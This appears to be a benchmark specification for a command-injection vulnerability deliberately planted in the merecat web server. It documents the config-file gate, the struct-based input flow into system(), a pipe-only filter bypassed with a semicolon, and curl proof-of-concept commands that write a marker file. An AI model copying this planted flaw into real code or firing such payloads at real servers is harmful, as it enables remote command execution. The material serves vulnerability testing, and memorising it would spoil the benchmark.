AXES:        C3 I3 S2

DESCRIPTION:
  Config-file-gated command injection with runtime initialization state.
  The server must be started with --exec-config (sets exec_mode, exec_logging,
  exec_secret) and /exec/init?token=<secret> must be called first. The cmd
  query parameter flows through an exec_args_t struct into a dispatch helper
  that calls system(). Pipe character is blocked; bypass with semicolon.

CONFIG_GATE (C3 — config file + runtime state):
  mechanism:  minimal key=value parser; --exec-config PATH reads file into
              struct exec_config { int enabled; int logging; char secret[64]; }
              A separate global exec_initialized is set to 1 by /exec/init.
  check:      exec_cfg.enabled && exec_initialized guard above system()
  complexity: requires modelling file I/O data flow AND inter-request state

INPUT_FLOW (I3 — struct dispatch):
  entry:      HTTP GET /exec?cmd=<payload>  →  hc->query
  path:       httpd_start_request() → handle_exec() → dispatch_exec()
              cmd stored in exec_args_t.cmd field, then system() via helper
  transforms: pointer through struct, helper function call

SANITIZATION (S2 — bypassable pipe check):
  check:      strchr(cmd, '|') != NULL → 403
  bypass:     use semicolon: cmd=id;id>/tmp/poc_158_marker

SINK:        system() in dispatch_exec() (src/libhttpd.c)

CHANGED FILES:
  src/merecat.c — adds struct exec_config (with secret), exec_initialized,
                  --exec-config pre-scan parser
  src/libhttpd.c — adds handle_exec_init(), exec_args_t, dispatch_exec(),
                   handle_exec() (I3/S2), route guard

EXPLOIT:
  build:   bash build.sh
  start:   printf "exec_mode=1\nexec_logging=1\nexec_secret=s3cr3t158\n" > /tmp/e.conf
           ./merecat -n -p 18158 /tmp/www --exec-config /tmp/e.conf
  init:    curl 'http://127.0.0.1:18158/exec/init?token=s3cr3t158'
  trigger: curl 'http://127.0.0.1:18158/exec?cmd=id;id>/tmp/poc_158_marker'
  verify:  cat /tmp/poc_158_marker
  expect:  uid= line written by server process

  gate bypass: omitting --exec-config causes /exec to return 404.
  S2 bypass: semicolon (;) is not filtered, only pipe (|).

NOTES:
  - system() output goes to server stdout/stderr, not HTTP response body.
  - merecat takes ~2s to bind; PoC uses sleep 2.
